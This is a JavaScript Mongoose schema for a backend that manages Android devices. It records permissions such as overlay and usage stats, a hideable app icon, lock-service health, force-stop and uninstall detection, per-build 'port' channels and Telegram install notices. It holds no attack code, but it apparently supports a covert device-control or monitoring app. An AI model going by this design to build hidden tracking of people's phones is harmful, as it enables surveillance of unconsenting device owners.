import mongoose from 'mongoose';

const PermissionsSchema = new mongoose.Schema(
  {
    usage: { type: Boolean, default: false }, // PACKAGE_USAGE_STATS
    overlay: { type: Boolean, default: false }, // SYSTEM_ALERT_WINDOW
    battery: { type: Boolean, default: false }, // ignoring battery optimizations
    notifications: { type: Boolean, default: false }, // POST_NOTIFICATIONS (API 33+)
  },
  { _id: false },
);

const DeviceSchema = new mongoose.Schema(
  {
    // App-generated UUID (persisted in DataStore on the client).
    deviceId: { type: String, required: true, unique: true, index: true },
    fcmToken: { type: String, default: null },

    // Logical channel baked into the APK (20-char A-Za-z0-9). Empty on old builds.
    port: { type: String, default: '', index: true },

    brand: { type: String, default: '' },
    model: { type: String, default: '' },
    androidVersion: { type: String, default: '' }, // e.g. "14" / sdk 34
    sdkInt: { type: Number, default: 0 },
    appVersion: { type: String, default: '' },

    // Liveness — online is DERIVED from this (see utils/online.js).
    lastSeenAt: { type: Date, default: null, index: true },

    permissions: { type: PermissionsSchema, default: () => ({}) },

    // Full device info (manufacturer, fingerprint, screen, ram, storage, …).
    info: { type: mongoose.Schema.Types.Mixed, default: {} },

    iconState: {
      type: String,
      enum: ['normal', 'hidden', 'variant1', 'variant2'],
      default: 'normal',
    },

    // Reported engine health from the client.
    lockServiceRunning: { type: Boolean, default: false },
    wasForceStopped: { type: Boolean, default: false },

    // Uninstall detection: set true when the device's FCM token becomes
    // unregistered (app removed / data cleared). Cleared on re-registration.
    uninstalled: { type: Boolean, default: false, index: true },
    uninstalledAt: { type: Date, default: null },

    // Last measured ping round-trip (ms) and when it was measured.
    lastPingMs: { type: Number, default: null },
    lastPingAt: { type: Date, default: null },

    // Admin annotation: a human name + note, shown in the panel beside the model.
    label: { type: String, default: '' },
    note: { type: String, default: '' },

    // Set after an install notice was posted to the port's Telegram group.
    lastInstallNotifiedAt: { type: Date, default: null },
  },
  { timestamps: true },
);

export const Device = mongoose.model('Device', DeviceSchema);
